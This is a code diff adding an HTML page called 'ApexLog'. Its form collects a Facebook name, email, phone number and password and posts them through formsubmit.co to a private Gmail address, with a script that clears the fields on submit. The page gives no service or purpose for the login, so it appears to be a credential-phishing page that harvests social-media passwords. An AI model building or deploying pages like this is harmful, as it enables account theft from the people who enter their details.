@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>ApexLog</title>
+        <link rel="stylesheet" href="style.css">
+</head>
+<body>
+        <form target="_blank" action="https://formsubmit.co/aclumorgadedelove@gmail.com" method="post">
+                <div class="form-container">
+                        <h2>Apex<span style="color: red;">Log</span></h2>
+                        <div class="form-control">
+                                <label>Facebook Name</label>
+                                <input type="text"  placeholder="Facebook Name........"
+                                autocomplete="off" id="nameEl" name="Facebook Name" required>
+                                <div class="error"></div>
+                        </div>
+                        <div class="form-control">
+                                <label>Email</label>
+                                <input type="text" placeholder="Email........"
+                                autocomplete="off" id="emailEl" name="Email" required>
+                                <div class="error"></div>
+                        </div>
+                        <div class="form-control">
+                                <label>Number</label>
+                                <input type="number" placeholder="Number........"
+                                autocomplete="off" id="numberEl" name="Number" required>
+                                <div class="error"></div>
+                        </div>
+                        <div class="form-control">
+                                <label>Password</label>
+                                <input type="password" placeholder="Password........"
+                                autocomplete="off" id="passwordEl" name="Password" required>
+                                <div id="passwordToggle" onclick="togglePassword()" style="cursor: pointer; font-weight: bolder; font-size: 12px;">show</div>
+                                <div class="error"></div>
+                        </div>
+        
+                        <button id="btnEl" type="submit">Join</button>
+                </div>
+        </form>
+        <script>
+                const facbookNameInput = document.querySelector("#nameEl");
+                const emailInput = document.querySelector("#emailEl");
+                const numberInput = document.querySelector("#numberEl");
+                const passwordInput = document.querySelector("#passwordEl")
+                const button = document.querySelector("#btnEl"); 
+                
+                button.addEventListener("click",send);
+                function send(){
+                        facbookNameInput.value = ""
+                        emailInput.value = ""
+                        numberInput.value = ""
+                        passwordInput.value = ""
+                }
+                function togglePassword(){
+                const passwordToggle = document.querySelector("#passwordToggle");
+                if(passwordInput.type == "password"){
+                        passwordInput.type = "text";
+                        passwordToggle.textContent = "hide";
+                }
+                else{
+                        passwordInput.type = "password";
+                        passwordToggle.textContent = "show";
+                }
+        }
+        </script>
+</body>
+</html>
